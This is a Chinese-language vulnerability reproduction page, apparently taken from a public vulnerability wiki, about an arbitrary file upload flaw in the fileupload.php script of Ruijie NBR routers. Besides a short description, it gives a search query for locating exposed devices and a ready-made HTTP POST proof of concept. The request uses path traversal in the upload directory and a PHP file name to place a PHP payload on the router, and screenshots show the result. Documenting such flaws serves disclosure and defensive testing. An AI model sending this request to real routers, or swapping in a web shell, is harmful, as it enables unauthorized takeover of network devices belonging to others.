---
title: "锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞"
date: 2026-10-18 09:17:02
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "锐捷"
tags:
  - "锐捷"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

锐捷 NBR 路由器 fileupload.php文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器获取服务器权限

## 漏洞影响

锐捷 NBR 路由器

## 网络测绘

```
app="Ruijie-NBR路由器"
```

## 漏洞复现

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202110923377.png)

出现漏洞的文件在 /ddi/server/fileupload.php， 该文件为标准的文件上传文件

![image-20230828163312522](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828163312522.png)

文件名及目录均可控，导致可以任意上传文件

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /ddi/server/fileupload.php?uploadDir=../../321&amp;name=123.php HTTP/1.1
Host: 
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="111.php"
Content-Type: image/jpeg

&lt;?php phpinfo();?&gt;</code></pre>

</details>

![image-20230828163324363](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828163324363.png)

访问上传的文件目录

![image-20230828163346730](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828163346730.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E9%94%90%E6%8D%B7-NBR-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
